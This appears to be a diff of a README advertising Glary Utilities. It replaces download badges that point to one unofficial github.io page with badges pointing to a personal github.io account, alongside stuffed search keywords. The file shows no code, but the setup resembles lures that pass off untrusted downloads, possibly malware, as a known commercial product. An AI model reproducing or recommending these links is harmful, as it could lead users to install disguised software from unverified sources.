@@ -4,11 +4,8 @@
   <img src="https://cdn.neowin.com/news/images/uploaded/2025/09/1759172928_glary_utilities.webp" alt="Glary Utilities Logo"/>
 </div>
 
-<div align="center">
+[![GET Glary Tools](https://img.shields.io/badge/GET%20%E2%80%94%20Glary-Tools-0078D6?style=for-the-badge&logoColor=white)](https://lisabakero017.github.io/.github/Glary-Tools)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://glary-tools-data-cleanup-utility.github.io/.github/)
-
-</div>
 
 ---
 
@@ -30,11 +27,7 @@ Additional operations involving glary duplicate file finder, glary duplicate fin
   <img src="https://img.utdstc.com/screen/889/12c/88912c7e440b1749013272439df1a683d68f87b687690dd088eaf5f7c176b13b:600" alt="Program Screenshot"/>
 </div>
 
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://glary-tools-data-cleanup-utility.github.io/.github/)
-
-</div>
+[![GET Glary Tools](https://img.shields.io/badge/GET%20%E2%80%94%20Glary-Tools-0078D6?style=for-the-badge&logoColor=white)](https://lisabakero017.github.io/.github/Glary-Tools)
 
 ---
 
